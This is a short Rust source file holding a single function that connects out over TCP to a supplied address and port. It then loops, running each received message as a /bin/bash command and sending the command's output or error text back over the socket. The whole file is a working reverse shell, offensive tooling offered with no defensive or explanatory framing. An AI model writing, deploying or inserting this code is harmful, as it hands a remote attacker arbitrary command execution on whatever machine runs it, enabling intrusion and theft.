use std::net::TcpStream;
use std::io::{Read, Write};
use std::str;
use std::process::Command;

pub fn socket_connect(addr: &String, port: &String) {

    // connect to the socket
    let mut connection = TcpStream::connect(format!("{addr}:{port}")).unwrap();

    loop {
        // read
        let mut read_buf= [0u8; 1024];
        let bytes_read = connection.read(&mut read_buf).unwrap();
        let data = &read_buf[..bytes_read];

        // execute command
        let command = Command::new("/bin/bash")
            .arg("-c")
            .arg(str::from_utf8(&data).unwrap())
            .output()
            .unwrap();

        if command.status.success() == true { // ensure command success
            let raw = command.stdout;
            let output = str::from_utf8(&raw).unwrap();

            if output.len() > 0 {
                connection.write(output.as_bytes()).unwrap();
                connection.flush().unwrap();
            } else if output.len() == 0 {
                connection.write(" ".as_bytes()).unwrap();
                connection.flush().unwrap();
            }
        } else { // catch command error
            let raw = command.stderr;
            let output = str::from_utf8(&raw).unwrap();

            if output.len() > 0 {
                connection.write(output.as_bytes()).unwrap();
                connection.flush().unwrap();
            } else {
                connection.write("[COMMAND FAILED]".as_bytes()).unwrap();
                connection.flush().unwrap();
            }
        }
    }
}
